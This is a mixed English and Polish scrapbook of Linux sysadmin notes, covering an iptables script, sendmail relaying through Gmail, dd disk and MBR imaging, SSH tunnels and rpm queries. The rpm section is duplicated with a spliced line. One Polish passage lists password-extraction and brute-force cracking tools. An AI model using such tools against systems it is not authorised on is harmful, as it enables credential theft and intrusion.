    iptables -P OUTPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -F
    iptables -X
 
    #
    # First thing, drop illegal packets.
    #
    iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP # New not SYN
    iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
    iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
    iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP # NULL packets
    iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
    iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP # XMAS
    iptables -A INPUT -p tcp --tcp-flags FIN,ACK FIN -j DROP # FIN packet
    iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
 
    #
    # Accept all connections from trusted sources.
    # These are just examples. Beware that these would override any
    # conflicting rules that come after.
    #
    #iptables -A INPUT -p tcp -j ACCEPT -s 127.0.0.0/24
    #iptables -A INPUT -p tcp -j ACCEPT -s 10.0.0.0/8
    #iptables -A INPUT -p tcp -j ACCEPT -s 172.16.0.0/12
    #iptables -A INPUT -p tcp -j ACCEPT -s 192.168.0.0/16
 
    #
    # Accept some remote connections.
    # This is what the system exposes to the public.
    # This is what everyone outside the system can see.
    #
    # SSH
    iptables -A INPUT -p tcp --dport 22 -j ACCEPT
    # HTTP
    iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    # HTTPS
    iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    # SMTP
    iptables -A INPUT -p tcp --dport 25 -j ACCEPT
    # IMAP4 SSL
    iptables -A INPUT -p tcp --dport 993 -j ACCEPT
    # POP3 SSL
    iptables -A INPUT -p tcp --dport 995 -j ACCEPT
    # DNS -- typical queries
    iptables -A INPUT -p udp --dport 53 -j ACCEPT
    ## LDAP
    #iptables -A INPUT -p tcp --dport 389 -j ACCEPT
    ## LDAP SSL
    #iptables -A INPUT -p tcp --dport 636 -j ACCEPT
    ## SMB (Samba) - Note source range is limited to 192.168.0.0/24 subnet.
    #iptables -A INPUT -p udp -s 192.168.0.0/24 --dport 137 -j ACCEPT
    #iptables -A INPUT -p udp -s 192.168.0.0/24 --dport 138 -j ACCEPT
    #iptables -A INPUT -m state --state NEW -p tcp -s 192.168.0.0/24 --dport 139 -j ACCEPT
    #iptables -A INPUT -m state --state NEW -p tcp -s 192.168.0.0/24 --dport 445 -j ACCEPT
    ## DNS -- AXFR zone transfers
    #iptables -A INPUT -p tcp --dport 53 -j ACCEPT
    ## VPN -- Accept UDP on port 1194.
    #iptables -A INPUT -p udp --dport 1194 -j ACCEPT
    ## VPN -- Accept on interfaces with names beginning with 'tun'.
    #iptables -A INPUT -i tun+ -j ACCEPT
    ## NTP -- Not source range is limited to 10.1.0.0/24 subnet.
    #iptables -A INPUT -p udp --dport 123 -s 10.1.0.0/24 -j ACCEPT
    ## VMware console interface
    #iptables -A INPUT -p tcp --dport 902 -j ACCEPT
    ## SNMP Manager -- receive port for traps from agents.
    #iptables -A INPUT -p udp --dport 162 -j ACCEPT
    ## SNMP Agent -- receive port for requests from manager.
    #iptables -A INPUT -p udp --dport 161 -j ACCEPT
    # VNC -- This is usually a bad idea. A better way would use a tunnel.
    #iptables -A INPUT -p tcp --dport 5900 -j ACCEPT # VNC server
    #iptables -A INPUT -p tcp --dport 5500 -j ACCEPT # listening client
    # A better way to do this is to allow localhost connections and
    # use an SSH tunnel to provide VNC access to a remote connection.
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 5900 -j ACCEPT # VNC server
 
    #
    # Accept some localhost connections.
    # This is allows the given services to run but only listen to clients
    # through localhost connections. For example, users and applications on
    # this server may use MySQL, but remote connection to MySQL are blocked.
    # Most servers allow you to configure them to listen only to localhost,
    # but these rules actually enforce a secure configuration.
    #
    # IMAP4
    iptables -A INPUT -p tcp -s 127.0.0.1 --dport 143 -j ACCEPT
    # POP3
    iptables -A INPUT -p tcp -s 127.0.0.1 --dport 110 -j ACCEPT
    # MySQL
    iptables -A INPUT -p tcp -s 127.0.0.1 --dport 3306 -j ACCEPT
    # PostgreSQL
    iptables -A INPUT -p tcp -s 127.0.0.1 --dport 5432 -j ACCEPT
    ## Oracle
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 1521 -j ACCEPT
    ## Oracle TTC
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 2483 -j ACCEPT
    ## Oracle TTC SSL
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 2484 -j ACCEPT
    ## Bind RNDC -- This is needed only by Bind 9 and not other DNS servers.
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 953 -j ACCEPT
    ## Subversion svnserve (not required if using svn+ssh URL scheme).
    #iptables -A INPUT -p tcp -s 127.0.0.1 --dport 3690 -j ACCEPT
 
    #
    # Accept limited ping (ICMP).
    # Allow valid, slow pings. Ping is useful, but it can be abused.
    # Note that this will cause ping packet loss if the ICMP packets
    # come in faster than 10 per second, so using "ping -f" to test
    # connection reliability will give false bad readings.
    # This is put after most other rules because ICMP is a low priority.
    #
    iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT
    iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT
    iptables -A INPUT -p icmp --icmp-type 11 -j ACCEPT
    iptables -A INPUT -p icmp --icmp-type 8 -m limit --limit 10/second -j ACCEPT
    iptables -A INPUT -p icmp -j DROP
 
    #
    # Match related and established state connections. This allows localhost
    # initiated inbound connections such as those from ftp to work properly.
    #
    iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
 
    #
    # These default policies handle anything not covered by a prior rule.
    #
    iptables -P INPUT DROP
    iptables -P OUTPUT ACCEPT
    iptables -P FORWARD ACCEPT
    ;;
  stop)
    iptables -P INPUT ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -F
    iptables -X
    ;;
  status)
    iptables -L -v
    ;;
  rhsave)
    /etc/init.d/iptables save
    ;;
  *)
    echo "Usage: $0 {start|stop|status|rhsave}" >&2
    exit 1
    ;;
esac
 
exit 0

-----------------

amanda
backuppc
bacula

-------------------------

mii-tool 
mii-tool -v eth0
ethtool

---------------------

                                                                                                                                                                 Kompilowanie programów ze źródeł

Krótki opis jak wygląda (przykładowo) kompilowanie programów w konsoli, może kiedyś przyda się:
sudo apt-get build-dep nazwa_aplikacji // wpisz nazwę aplikacji, którą chcesz skompilować (np.: sudo apt-get build gajim)
wget http://adres_www/źródła.tar.bz2 (lub ...tar.gz) // wget służy do pobierania plików z Internetu (wget plik_do_pobrania)
tar xjf zródła.tar.bz2 lub tar xzf źródła.tar.gz // rozpakuj pobrane źródła
cd ./źródła // wejdź do katalogu, w którym znajdują się rozpakowane źródła (np.: cd /home/nazwa_usera/źródła)
./configure
make // kompilowanie programu
sudo make install // instalowanie skompilowanego programu
sudo make uninstall && sudo make clean // usuwanie/odinstalowanie skompilowanego programu


---------------------------------------
Configure SMTP Relay

1. log in as root

2. open file /etc/mail/sendmail.mc

vi /etc/mail/sendmail.mc

find and uncomment the line containing SMART_HOST, change its value to 'relay-smtp-server', which is the preferred smtp server for relaying email.

define(`SMART_HOST', `relay-smtp-server')

note:

    * to comment and uncomment code in this configuration file, use 'dnl'. for each line, any text after 'dnl' will be treated as comment. 

3. Then create the file /etc/mail/sendmail.cf

m4 /etc/mail/sendmail.mc > /etc/mail/sendmail.cf

4. restart sendmail serv

/sbin/service sendmail restart 

------------------
Using Gmail as Sendmail's relay

Comcast just started blocking port 25 at my house which caused sendmail to be unable to connect to external mail servers to deliver mail. Some people have been able to convince Comcast to open up the port for them but we weren’t so lucky. Instead, I changed sendmail to use Gmail’s SMTP server as its relay server.

Before making these changes I’d see lots of errors in /var/log/mail.log ending in stat=Deferred: Connection timed out with aspmx2.googlemail.com. or something similar. Trying to telnet aspmx2.googlemail.com 25 would result in a timeout.

I found all the information on how to do this in these two articles; Yan Li’s Words: Gmail, Fetchmail and Sendmail on UNIX/Linux and Linux, Sendmail and Gmail.com.

All of this was done on a server running Ubuntu 8.04.2 and sendmail 8.14.2.
Step 1

Edit your /etc/mail/sendmail.mc and add the following above the MAILER_DEFINITIONS block at the bottom. I tried putting these lines at the very bottom of the file the first time and it didn’t work. I suggest copy/pasting because the quotes are very strange.

define(`SMART_HOST',`smtp.gmail.com')dnl
define(`RELAY_MAILER_ARGS', `TCP $h 587')dnl
define(`ESMTP_MAILER_ARGS', `TCP $h 587')dnl
define(`confAUTH_MECHANISMS', `EXTERNAL GSSAPI DIGEST-MD5 CRAM-MD5 LOGIN PLAIN')dnl
FEATURE(`authinfo',`hash /etc/mail/auth/client-info')dnl

Step 2

Create the /etc/mail/auth/client-info file by running:

% mkdir -p /etc/mail/auth
% chmod 700 /etc/mail/auth
% touch /etc/mail/auth/client-info
% chmod 600 client-info

Step 3

Edit /etc/mail/auth/client-info and fill it with the lines below. Replace user_id with your Gmail user id (user_id@gmail.com) and password with your password. Make sure there is a blank line at the end of the file.

AuthInfo:smtp.gmail.com "U:smmsp" "I:user_id" "P:password" "M:PLAIN"
AuthInfo:smtp.gmail.com:587 "U:smmsp" "I:user_id" "P:**password" "M:PLAIN"

Step 4

Compile the client-info file.

% cd /etc/mail/auth
% makemap -r hash client-info.db < client-info

Step 5

Compile update sendmail.cf with our sendmail.mc changes.

% cd /etc/mail
% make

Step 6

Reload the sendmail configuration.

/etc/init.d/sendmail reload

Now if you check your /var/log/mail.log you should see any queued messages being sent properly. You should see relay=smtp.gmail.com and stat=Sent. If not, make sure you didn’t miss a step above.

--------------------------------

full hard disk copy

dd if=/dev/hdx of=/dev/hdy
dd if=/dev/hdx of=/path/to/image
dd if=/dev/hdx | gzip > /path/to/image.gz

Hdx could be hda, hdb etc. In the second example gzip is used to compress the image if it is really just a backup.

Restore Backup of hard disk copy

dd if=/path/to/image of=/dev/hdx

gzip -dc /path/to/image.gz | dd of=/dev/hdx

---------------------

How to enable SSH X11 forwarding through additional server?
A$ ssh -X B
B$ ssh -X C
C$ xclock
Error: Can't open display:

First, connect to machine B and forward [localPort] to C:22 through B

A$ ssh -L [localPort]:C:22 B

Next, connect to C from A through this newly-created tunnel using [localPort], forwarding X11

A$ ssh -X -p [localPort] localhost

Now we can run X11 programs on C and have them display on A

C$ xclock

[localPort] can be any port that you are not already listening to on A, I often use 2222 for simplicity.

--

A$ ssh -NL 2022:C:22 B &
A$ ssh -X -p 2022 localhost
C$ xclock

--

A$ ssh -Y B
B$ ssh -Y C
C$ xlclock

----------------------------------------

Stop or Start (Restart) a Windows service from a Linux machine

net rpc -I ADDRESS -U USERNAME%PASSWORD service {stop|start} SVCNAME

----------------------------------------

kill all instances of an annoying or endless, thread-spawning process 

ps auxwww | grep outofcontrolprocess | awk '{print $2}' | xargs kill -9

--------------------------------------

Create a monitoring system in Ubuntu with webcam
This post was written by admin on September 7, 2010
Posted Under: Internet

At the present time,most laptops and netbooks have built-in webcam,with that you can use a software in Ubuntu called Motion to create a monitoring system to monitor kids while you are at work,or have a home-made surveillance.

To install Motion in Ubuntu is very easy,just open up a teminal window from Applications->Accessories menu,and run this command:

sudo aptitude install motion

Then open the configuration file with your favourite editor,and activate motion in daemon mode,change the image resolution,adjust the brightness, contrast and saturation,etc.. (Read the original post to do these configurations)

sudo gedit /etc/motion/motion.conf

After that save the file, and add to our username the group motion:

adduser USER motion

Note that you can remove motion from autostart at login with this command:

update-rc.d -f motion remove

From now on we will decide when to start motion and video surveillance, with a simple terminal command as simple user: motion
When the daemon is started, the management of motion can be made through web interface. Open your browser and point to this address:

http://localhost:8080

---------------------------------------

webcam-server

http://www.linuxaria.com/article/webcam-server-su-linux-2?lang=it

-----------------

Check a server is up. If it isn't mail me.

ping -q -c1 -w3 server.example.com >& /dev/null || echo server.example.com ping failed | mail -ne -s'Server unavailable' admin@example.com
curl -fs brandx.jp.sme 2&>1 > /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
ping -q -c1 -w3 brandx.jp.sme 2&>1 /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
nc -zw2 www.example.com 80 || echo http service is down | mail -s 'http is down' admin@example.com

-------------------------------------

http://www.andybotting.com/wordpress/how-do-you-clone-an-lvm-partition

How do you clone an LVM partition

# lvcreate --size 2G --snapshot --name rootlv-snap /dev/vg/rootlv

# lvcreate --size 10G --name newrootvg-disk vg

# mkfs.xfs /dev/vg/newrootvg-disk

# mkdir /mnt/host-disk-snap
# mount -o ro /dev/vg/rootlv-snap /mnt/host-disk-snap
 
# mkdir /mnt/newrootlv-disk
# mount /dev/vg/newhost-disk /mnt/newrootlv-disk

# cd /mnt/host-disk-snap

# find . -mount -print | cpio -pdm /mnt/newrootlv-disk

# umount /mnt/host-disk-snap
# lvremove /dev/vg/rootlv-snap


----------------------------------------

Krótki opis:

browser – programy do wyciąganie haseł z takich przeglądarek jak Firefox, Chrome, Internet Explorer, Opera

brutessh – atak słownikowy na ssh

cewl – do tworzenia słowników

chntpw – zmienia hasła w systemach NT/2000/XP/Vista/7

dnsbruteforce – atak słownikowy dla serwer-ów DNS

email – program do wyciągania haseł z Outlook Express Thunderbird

network – program do wyciągania haseł sieciowych z systemu Windows

passwd-toolkit – bruteforce przeciw web auth

rarcrack – do łamania haseł w archiwum RAR

saltymd5 – do łamania hash-ów MD5

tftp bruteforce – atak na tftp


-------------------------

lotto generator

echo $(shuf -n 6 -i 1-49 | sort -n)

---------------------------

Run local bash script on remote server

ssh -T user@server <script.sh

--------------------------------

Bash history
~/.bashrc
view sourceprint?
01.# enable bash history
02.set -o history
03.# bash history file length
04.export HISTFILESIZE=10000
05.# multi-line commands are stored in the history
06.shopt -s cmdhist
07.# no duplicates and empty lines
08.export HISTCONTROL=ignoreboth
09.# do not store lines:
10.export HISTIGNORE="&:ls:[bf]g:exit"
11.# append the history to the histfile instead of overwriting it.
12.shopt -s histappend
13.# update & re-read histfile after every cmd so terminals will share
14.export PROMPT_COMMAND="history -n; history -a"

------------------------------

decompiler for jar files using jad

$ unjar () { mkdir -p /tmp/unjar/$1 ; unzip -d /tmp/unjar/$1 $1 *class 1>/dev/null && find /tmp/unjar/$1 -name *class -type f | xargs jad -ff -nl -nonlb -o -p -pi99 -space -stat ; rm -r /tmp/unjar/$1 ; }

----------------------------------

Sending binary e-mail attachments from the command line with mutt 

echo "Cheeseburger" | mutt -s "OHAI!" -a lolcat.jpg -- recipient@domain.com

------------------------------------

Tip #803: MBR (Master Boot Record) backup & restore
od shell-fu
1 osoba dodała ten element do ulubionych
Backup your MBR:

dd if=/dev/sda of=/root/mbr.img bs=1 count=512


Restore MBR:

dd if=/root/mbr.img of=/dev/sda bs=1 count=512


Restore only bootstrap (part of MBR):

dd if=/temp/mbr.img of=/dev/sda bs=1 count=446


Restore only partition table (part of MBR):

dd if=/temp/mbr.img of=/dev/sda skip=446 seek=446 bs=1 count=64


If you want to learn more about mbr check here: http://en.wikipedia.org/wiki/Master_boot_record

-----------------------------------------
      # rpm -q -i bash
      Name        : bash                         Relocations: (not relocatable)
      Version     : 3.2                               Vendor: Red Hat, Inc.
      Release     : 24.el5                        Build Date: Tue 21 Oct 2008 02:15:55 PM CEST
      Install Date: Tue 23 Feb 2010 08:06:34 PM CET      Build Host: hs20-bc1-7.build.redhat.com
      Group       : System Environment/Shells     Source RPM: bash-3.2-24.el5.src.rpm
      Size        : 5349546                          License: GPLv2+
      Signature   : DSA/SHA1, Mon 08 Dec 2008 01:25:44 PM CET, Key ID 5326810137017186
      Packager    : Red Hat, Inc. <http://bugzilla.redhat.com/bugzilla>
      URL         : http://www.gnu.org/software/bash
      Summary     : The GNU Bourne Again shell (bash) version 3.1.
      Description :
      The GNU Bourne Again shell (Bash) is a shell or command language
      interpreter that is compatible with the Bourne shell (sh). Bash
      incorporates useful features from the Korn shell (ksh) and the C shell
      (csh). Most sh scripts can be run by bash without modification. This
      package (bash) contains bash version 3.1, which improves POSIX
      compliance over previous versions.

      Znaczenie powyższych pól jest następujące:
          o Name – nazwa pakietu, którego dotyczyło pytane. Najczęściej jest powiązane z nazwą aplikacji jaka jest instalowana przez podany pakiet, ale nie zawsze (np. pakiety httpd, coreutils).
          o Version – główna wersja aplikacji, taka na podstawie której został stworzony pakiet instalacyjny.
          o Release – wersja wydania danego pakietu. Jeżeli zmienia się pole Version to powinna mieć wartość 1. Jest zwiększana zawsze w momencie wprowadzenia zmian w stosunku do podstawowej wersji aplikacji.
          o Install date – data instalacji pakietu w systemie.
          o Group – grupa, do której należy pakiet.
          o Size – łączony rozmiar wszystkich plików jakie znajdują się w danym pakiecie.
          o Summary – krótki opis pakietu.
          o Description – dłuższy, dokładniejszy opis pakietu.
          o Packager – kto jest odpowiedzialny za stworzenie pakietu (pakietu, nie samej aplikacji).
          o Build Date – data utworzenia pakietu.
          o Build Host – nazwa komputera, na którym nastąpiło utworzenie pakietu.
          o Source RPM – nazwa źródłowego pliku RPM, na podstawie którego utworzono pakiet.
          o License – licencja na podstawie której jest rozprowadzana dana aplikacji.
          o URL – adres do strony danej aplikacji.
    * -l – lista plików
      Parametr ten powoduje wyświetlenie listy plików, jakie znajdują się w danym pakiecie:
      # rpm -ql bash                                                          
      /bin/bash                                                                                  
      /bin/sh                                                                                    
      /etc/skel/.bash_logout                                                                    
      /etc/skel/.bash_profile                                                                    
      /etc/skel/.bashrc                                                                          
      /usr/bin/bashbug-32                                                                        
      /usr/share/doc/bash-3.2                                                                    
      /usr/share/doc/bash-3.2/CHANGES                                                            
      /usr/share/doc/bash-3.2/COMPAT                                                            
      ....

      Można także dodatkowo dodać przełącznik -v, który spowoduje wyświetleni dodatkowych informacji o poszczególnych plikach:
      # rpm -qvl bash
      -rwxr-xr-x    1 root    root           729292 Oct 21  2008 /bin/bash
      lrwxrwxrwx    1 root    root                4 Oct 21  2008 /bin/sh -> bash
      -rw-r--r--    1 root    root               33 Oct 21  2008 /etc/skel/.bash_logout
      -rw-r--r--    1 root    root              176 Oct 21  2008 /etc/skel/.bash_profile
      -rw-r--r--    1 root    root              124 Oct 21  2008 /etc/skel/.bashrc
      -rwxr-xr-x    1 root    root             7044 Oct 21  2008 /usr/bin/bashbug-32
      drwxr-xr-x    2 root    root                0 Oct 21  2008 /usr/share/doc/bash-3.2
      -rw-r--r--    1 root    root           221125 Sep 26  2006 /usr/share/doc/bash-3.2/CHANGES
      -rw-r--r--    1 root    root            11659 Aug 29  2006 /usr/share/doc/bash-3.2/COMPAT
      -rw-r--r--    1 root    root            73644 Oct 10  2006 /usr/share/doc/bash-3.2/FAQ
      ....
    * -c – wyświetlenie plików konfiguracyjnych
      W pliku RPM pliki z konfiguracją aplikacji są traktowane w specyficzny sposób, w związku z czym muszą być odpowiednio oznaczone. Z tego też powodu możemy w łatwy sposób sprawdzić, jakie pliki konfiguracyjne zwiera dany pakiet:
      # rpm -qc bash
      /etc/skel/.bash_logout
      /etc/skel/.bash_profile
      /etc/skel/.bashrc
    * -d – wyświetlenie plików z dokumentacją
      Przełącznik ten pozwala na wyświetlenie wszystkich plików z dokumentacją, jakie znajdują się w danym pakiecie:
      # rpm -qd bash | head
      /usr/share/doc/bash-3.2/CHANGES
      /usr/share/doc/bash-3.2/COMPAT
      /usr/share/doc/bash-3.2/FAQ
      /usr/share/doc/bash-3.2/INTRO
      /usr/share/doc/bash-3.2/NEWS
      /usr/share/doc/bash-3.2/NOTES
      /usr/share/doc/bash-3.2/POSIX
      /usr/share/doc/bash-3.2/article.ms
      /usr/share/doc/bash-3.2/article.ps
      /usr/share/doc/bash-3.2/article.txt
      ....
    * --provides – zależności dostarczane przez pakiet

      Można wyświetlić informacje, jakie dodatkowe zależności, możliwości udostępnia wybrany pakiet (są one potem używane przez inne pakiety do określenia co jest wymagane do instalacji danego pakietu):
      # rpm -q --provides -p libicu-3.6-5.11.4.i386.rpm
      libicudata.so.36
      libicui18n.so.36
      libicuio.so.36
      libicule.so.36
      libiculx.so.36
      libicutu.so.36
      libicuuc.so.36
      libicu = 3.6-5.11.4
    * --requires – czego wymaga dany pakiet do instalacji

      W każdym pakiecie może znajdować się informacja o zależnościach, które muszą zostać spełnione zanim zostanie on zainstalowany:
      # rpm -q --requires -p x3270-3.3.4p7-3.el5.4.i386.rpm
      config(x3270) = 3.3.4p7-3.el5.4
      libc.so.6
      libc.so.6(GLIBC_2.0)
      libc.so.6(GLIBC_2.1)
      libc.so.6(GLIBC_2.3)
      libc.so.6(GLIBC_2.3.4)
      libc.so.6(GLIBC_2.4)
      libcrypto.so.6
      libicui18n.so.36
      libicuuc.so.36
      libnsl.so.1
      libssl.so.6
      libutil.so.1
      rpmlib(CompressedFileNames) <= 3.0.4-1
      rpmlib(PayloadFilesHavePrefix) <= 4.0-1
      rtld(GNU_HASH)
      xorg-x11-font-utils

      Jak widać, pakiet x3270-3.3.4p7-3.el5.4.i386.rpm wymaga spełnienia szeregu różnych zależności w celu jego instalacji. Można zauważyć, że na liście są wymieniane biblioteki ibicui18n.so.36 oraz libicuuc.so.36, które są udostępniane przez pakiet libicu-3.6-5.11.4.i386.rpm.
    * --scripts – wyświetlenie skryptów instalacyjnych

      Polecenie to spowoduje wyświetlenie skryptów wykonywanych zarówno przed/po instalacji/odinstalowaniu aplikacji.
      # rpm -q --scripts initscripts
      preinstall scriptlet (using /bin/sh):Wybór informacji do wyświetlenie

    * brak kryteriów
      Jeżeli zostanie pominięty ten parametr, to po prosty polecenie rpm wyświetli nazwę i wersję pakietu:
      # rpm -q bash
      bash-3.2-24.el5
    * -i – wyświetlenie informacji o pakiecie

      Polecenie to pozwala na wyświetlenie szczegółowych informacji o wybranym pakiecie:
      # rpm -q -i bash
      Name        : bash                         Relocations: (not relocatable)
      Version     : 3.2                               Vendor: Red Hat, Inc.
      Release     : 24.el5                        Build Date: Tue 21 Oct 2008 02:15:55 PM CEST
      Install Date: Tue 23 Feb 2010 08:06:34 PM CET      Build Host: hs20-bc1-7.build.redhat.com
      Group       : System Environment/Shells     Source RPM: bash-3.2-24.el5.src.rpm
      Size        : 5349546                          License: GPLv2+
      Signature   : DSA/SHA1, Mon 08 Dec 2008 01:25:44 PM CET, Key ID 5326810137017186
      Packager    : Red Hat, Inc. <http://bugzilla.redhat.com/bugzilla>
      URL         : http://www.gnu.org/software/bash
      Summary     : The GNU Bourne Again shell (bash) version 3.1.
      Description :
      The GNU Bourne Again shell (Bash) is a shell or command language
      interpreter that is compatible with the Bourne shell (sh). Bash
      incorporates useful features from the Korn shell (ksh) and the C shell
      (csh). Most sh scripts can be run by bash without modification. This
      package (bash) contains bash version 3.1, which improves POSIX
      compliance over previous versions.

      Znaczenie powyższych pól jest następujące:
          o Name – nazwa pakietu, którego dotyczyło pytane. Najczęściej jest powiązane z nazwą aplikacji jaka jest instalowana przez podany pakiet, ale nie zawsze (np. pakiety httpd, coreutils).
          o Version – główna wersja aplikacji, taka na podstawie której został stworzony pakiet instalacyjny.
          o Release – wersja wydania danego pakietu. Jeżeli zmienia się pole Version to powinna mieć wartość 1. Jest zwiększana zawsze w momencie wprowadzenia zmian w stosunku do podstawowej wersji aplikacji.
          o Install date – data instalacji pakietu w systemie.
          o Group – grupa, do której należy pakiet.
          o Size – łączony rozmiar wszystkich plików jakie znajdują się w danym pakiecie.
          o Summary – krótki opis pakietu.
          o Description – dłuższy, dokładniejszy opis pakietu.
          o Packager – kto jest odpowiedzialny za stworzenie pakietu (pakietu, nie samej aplikacji).
          o Build Date – data utworzenia pakietu.
          o Build Host – nazwa komputera, na którym nastąpiło utworzenie pakietu.
          o Source RPM – nazwa źródłowego pliku RPM, na podstawie którego utworzono pakiet.
          o License – licencja na podstawie której jest rozprowadzana dana aplikacji.
          o URL – adres do strony danej aplikacji.
    * -l – lista plików
      Parametr ten powoduje wyświetlenie listy plików, jakie znajdują się w danym pakiecie:
      # rpm -ql bash                                                          
      /bin/bash                                                                                  
      /bin/sh                                                                                    
      /etc/skel/.bash_logout                                                                    
      /etc/skel/.bash_profile                                                                    
      /etc/skel/.bashrc                                                                          
      /usr/bin/bashbug-32                                                                        
      /usr/share/doc/bash-3.2                                                                    
      /usr/share/doc/bash-3.2/CHANGES                                                            
      /usr/share/doc/bash-3.2/COMPAT                                                            
      ....

      Można także dodatkowo dodać przełącznik -v, który spowoduje wyświetleni dodatkowych informacji o poszczególnych plikach:
      # rpm -qvl bash
      -rwxr-xr-x    1 root    root           729292 Oct 21  2008 /bin/bash
      lrwxrwxrwx    1 root    root                4 Oct 21  2008 /bin/sh -> bash
      -rw-r--r--    1 root    root               33 Oct 21  2008 /etc/skel/.bash_logout
      -rw-r--r--    1 root    root              176 Oct 21  2008 /etc/skel/.bash_profile
      -rw-r--r--    1 root    root              124 Oct 21  2008 /etc/skel/.bashrc
      -rwxr-xr-x    1 root    root             7044 Oct 21  2008 /usr/bin/bashbug-32
      drwxr-xr-x    2 root    root                0 Oct 21  2008 /usr/share/doc/bash-3.2
      -rw-r--r--    1 root    root           221125 Sep 26  2006 /usr/share/doc/bash-3.2/CHANGES
      -rw-r--r--    1 root    root            11659 Aug 29  2006 /usr/share/doc/bash-3.2/COMPAT
      -rw-r--r--    1 root    root            73644 Oct 10  2006 /usr/share/doc/bash-3.2/FAQ
      ....
    * -c – wyświetlenie plików konfiguracyjnych
      W pliku RPM pliki z konfiguracją aplikacji są traktowane w specyficzny sposób, w związku z czym muszą być odpowiednio oznaczone. Z tego też powodu możemy w łatwy sposób sprawdzić, jakie pliki konfiguracyjne zwiera dany pakiet:
      # rpm -qc bash
      /etc/skel/.bash_logout
      /etc/skel/.bash_profile
      /etc/skel/.bashrc
    * -d – wyświetlenie plików z dokumentacją
      Przełącznik ten pozwala na wyświetlenie wszystkich plików z dokumentacją, jakie znajdują się w danym pakiecie:
      # rpm -qd bash | head
      /usr/share/doc/bash-3.2/CHANGES
      /usr/share/doc/bash-3.2/COMPAT
      /usr/share/doc/bash-3.2/FAQ
      /usr/share/doc/bash-3.2/INTRO
      /usr/share/doc/bash-3.2/NEWS
      /usr/share/doc/bash-3.2/NOTES
      /usr/share/doc/bash-3.2/POSIX
      /usr/share/doc/bash-3.2/article.ms
      /usr/share/doc/bash-3.2/article.ps
      /usr/share/doc/bash-3.2/article.txt
      ....
    * --provides – zależności dostarczane przez pakiet

      Można wyświetlić informacje, jakie dodatkowe zależności, możliwości udostępnia wybrany pakiet (są one potem używane przez inne pakiety do określenia co jest wymagane do instalacji danego pakietu):
      # rpm -q --provides -p libicu-3.6-5.11.4.i386.rpm
      libicudata.so.36
      libicui18n.so.36
      libicuio.so.36
      libicule.so.36
      libiculx.so.36
      libicutu.so.36
      libicuuc.so.36
      libicu = 3.6-5.11.4
    * --requires – czego wymaga dany pakiet do instalacji

      W każdym pakiecie może znajdować się informacja o zależnościach, które muszą zostać spełnione zanim zostanie on zainstalowany:
      # rpm -q --requires -p x3270-3.3.4p7-3.el5.4.i386.rpm
      config(x3270) = 3.3.4p7-3.el5.4
      libc.so.6
      libc.so.6(GLIBC_2.0)
      libc.so.6(GLIBC_2.1)
      libc.so.6(GLIBC_2.3)
      libc.so.6(GLIBC_2.3.4)
      libc.so.6(GLIBC_2.4)
      libcrypto.so.6
      libicui18n.so.36
      libicuuc.so.36
      libnsl.so.1
      libssl.so.6
      libutil.so.1
      rpmlib(CompressedFileNames) <= 3.0.4-1
      rpmlib(PayloadFilesHavePrefix) <= 4.0-1
      rtld(GNU_HASH)
      xorg-x11-font-utils

      Jak widać, pakiet x3270-3.3.4p7-3.el5.4.i386.rpm wymaga spełnienia szeregu różnych zależności w celu jego instalacji. Można zauważyć, że na liście są wymieniane biblioteki ibicui18n.so.36 oraz libicuuc.so.36, które są udostępniane przez pakiet libicu-3.6-5.11.4.i386.rpm.
    * --scripts – wyświetlenie skryptów instalacyjnych

      Polecenie to spowoduje wyświetlenie skryptów wykonywanych zarówno przed/po instalacji/odinstalowaniu aplikacji.
      # rpm -q --scripts initscripts
      preinstall scriptlet (using /bin/sh):
      /usr/sbin/groupadd -g 22 -r -f utmp
      postinstall scriptlet (using /bin/sh):
      touch /var/log/wtmp /var/run/utmp /var/log/btmp
      chown root:utmp /var/log/wtmp /var/run/utmp /var/log/btmp
      chmod 664 /var/log/wtmp /var/run/utmp
      chmod 600 /var/log/btmp

      /sbin/chkconfig --add netfs
      /sbin/chkconfig --add network
      /sbin/chkconfig --add netconsole
      /sbin/chkconfig --add rawdevices
      preuninstall scriptlet (using /bin/sh):
      if [ $1 = 0 ]; then
        /sbin/chkconfig --del netfs
        /sbin/chkconfig --del network
        /sbin/chkconfig --del netconsole
        /sbin/chkconfig --del rawdevices
      fi
    * queryformat – samodzielne utworzenie informacji o pakiecie

      Polecenie to pozwala na samodzielne zdefiniowanie listy informacji, jakie zostaną wyświetlone o danym pakiecie. Pełny opis polecenie znajduje się w dokumentacji oraz na stronach podanych na końcu wpisu.

      Wyświetlenie nazwy oraz wersji pakietu:
      # rpm -q --queryformat '%{NAME}-%{VERSION}-%{RELEASE}\n' bash
      bash-3.2-24.el5

      Wyświetlenie daty instalacji pakietu:
      # rpm -q --queryformat '%{NAME} was installed on %{INSTALLTIME:date}\n' bash
      bash was installed on Tue 23 Feb 2010 08:06:34 PM CET

      Wyświetlenie listy plików, które znajdują się w pakiecie łącznie z ich rozmiarami:
      # rpm -q --queryformat '%{NAME}: [%{FILENAMES} (%{FILESIZES} bytes)\n]' bash
      bash: /bin/bash (729292 bytes)
      /bin/sh (4 bytes)
      /etc/skel/.bash_logout (33 bytes)
      /etc/skel/.bash_profile (176 bytes)
      /etc/skel/.bashrc (124 bytes)
      /usr/bin/bashbug-32 (7044 bytes)
